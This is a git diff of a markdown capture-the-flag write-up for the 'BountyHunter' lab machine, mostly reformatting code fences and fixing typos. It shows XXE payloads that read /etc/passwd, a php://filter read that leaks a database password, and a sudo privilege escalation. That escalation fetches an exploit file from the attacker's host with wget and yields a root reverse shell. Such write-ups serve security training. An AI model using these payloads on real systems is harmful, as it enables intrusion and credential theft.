@@ -8,9 +8,7 @@ categories:
 
 ## Enumeration
 
-### nmap
-
-```
+```bash
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
@@ -27,9 +25,7 @@ PORT   STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-### ffuf
-
-```
+```bash
         assets                  [Status: 301, Size: 313, Words: 20, Lines: 10]
         .htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
         .htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
@@ -50,7 +46,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
         index                   [Status: 200, Size: 0, Words: 1, Lines: 1]
 ```
 
-ok enumeration was nothing special but I found a db.php page but the page was empty..might have some nterresting php
+ok enumeration was nothing special but I found a db.php page but the page was empty...
+might have some interesting php
 
 enum on website gave us a log_submit.php page from portal button
 
@@ -58,7 +55,7 @@ note to self: consider adding nikto to my enum tools
 
 there is a php form to add bugs to a database
 
-```
+```php
 If DB were ready, would have added:
 Title: title
 CWE: CWE
@@ -72,13 +69,13 @@ POST request made to http://10.10.11.100/tracker_diRbPr00f314.php
 
 with a parameter
 
-```
+```text
 data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT50aXRsZTwvdGl0bGU%2BCgkJPGN3ZT5DV0U8L2N3ZT4KCQk8Y3Zzcz4wLjA8L2N2c3M%2BCgkJPHJld2FyZD4xPC9yZXdhcmQ%2BCgkJPC9idWdyZXBvcnQ%2B
 ```
 
 with decoder we see its xml format of our request (url decode + base64 decode)
 
-```
+```xml
 <?xml  version="1.0" encoding="ISO-8859-1"?>
 <bugreport>
 <title>title</title>
@@ -92,12 +89,12 @@ XML injection it is
 
 our XXE payload model will be simple like this
 
-`<!DOCTYPE data [ <!ENTITY file SYSTEM "file://{absolute file path}"> ]>`  
+`<!DOCTYPE data [ <!ENTITY file SYSTEM "file://{absolute file path}"> ]>`
 and `&file;` where we want the output
 
 So first test (make sure your xml is well-formatted! Used xmlgrid.net to check)
 
-```
+```xml
 <?xml  version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hosts">]>
 <bugreport>
@@ -111,7 +108,7 @@ So first test (make sure your xml is well-formatted! Used xmlgrid.net to check)
 we base64 encode it then url encode and pass it to repeater `data=` parameter
 And we get our output
 
-```
+```text
 127.0.0.1 localhost
 127.0.1.1 bountyhunter
 
@@ -124,9 +121,9 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-Great success..now we can read more interresting files like /etc/passwd
+Great success..now we can read more interesting files like /etc/passwd
 
-```
+```text
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -163,18 +160,20 @@ lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
 usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
 ```
 
-There is a `development` user but we can't read his .ssh/id_rsa key...lets try to read php files.../var/www/html/db.php
+There is a `development` user but we can't read his .ssh/id_rsa key...
+lets try to read php files.../var/www/html/db.php
 
-No output...but I could read another php file tracker_diRbPr00f314.php with no interresting output
+No output...but I could read another php file tracker_diRbPr00f314.php with no interesting output
 
-It means the payload is not convenient to read this one...there must be a php filter...so we change payload model
+It means the payload is not convenient to read this one...there must be a php filter...
+so we change payload model
 
-`<!DOCTYPE data [ <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource={absolute file path}"> ]>`  
+`<!DOCTYPE data [ <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource={absolute file path}"> ]>`
 with `&file;` for output
 
 Now when applied
 
-```
+```xml
 <?xml  version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php">]>
 <bugreport>
@@ -187,13 +186,13 @@ Now when applied
 
 We get our output
 
-```
+```b64
 PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=
 ```
 
 we decode it as base64
 
-```
+```php
 <?php
 // TODO -> Implement login system with the database.
 $dbserver = "localhost";
@@ -212,7 +211,7 @@ First things first..USER FLAG
 In the same folder we get `contract.txt`
 `development@bountyhunter:~$ cat contract.txt`
 
-```
+```text
 Hey team,
 
 I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.
@@ -226,7 +225,7 @@ I set up the permissions for you to test this. Good luck.
 
 And `dd.md`
 
-```
+```markdown
 # Skytrain Inc
 
 ## Ticket to
@@ -240,7 +239,7 @@ And `dd.md`
 Good old' privEsc ways
 `sudo -l`
 
-```
+```bash
 Matching Defaults entries for development on bountyhunter:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
@@ -251,11 +250,11 @@ User development may run the following commands on bountyhunter:
 we can run ticketValidator as root uh? let's make that python script spawn a shell
 
 copied the script in a python file to analyze it...it basically validate a markdown (.md) file with specific format
-the dd.md file is an example that matches exactly a valid file and anything inserted correctlly after "and" would be executed as root:
+the dd.md file is an example that matches exactly a valid file and anything inserted correctly after "and" would be executed as root:
 
 we modify it to get us a shell on netcat 2311
 
-```
+```markdown
 # Skytrain Inc
 
 ## Ticket to
@@ -266,14 +265,14 @@ we modify it to get us a shell on netcat 2311
 
 we prepare a server to send our `exploit.md` file
 
-```
+```bash
 sudo python -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
 we get it in /tmp folder
 
-```
+```bash
 development@bountyhunter:/tmp$ wget http://10.10.14.178/exploit.md
 --2021-11-03 14:17:42-- http://10.10.14.178/exploit.md
 Connecting to 10.10.14.178:80... connected.
@@ -288,7 +287,7 @@ exploit.md 100%[================================================================
 
 we execute the script
 
-```
+```bash
 development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
 Please enter the path to the ticket file.
 ./exploit.md
@@ -298,7 +297,7 @@ rm: cannot remove '/tmp/h': No such file or directory
 
 And we get a root shell on nc listener
 
-```
+```bash
 # id
 uid=0(root) gid=0(root) groups=0(root)
 ```
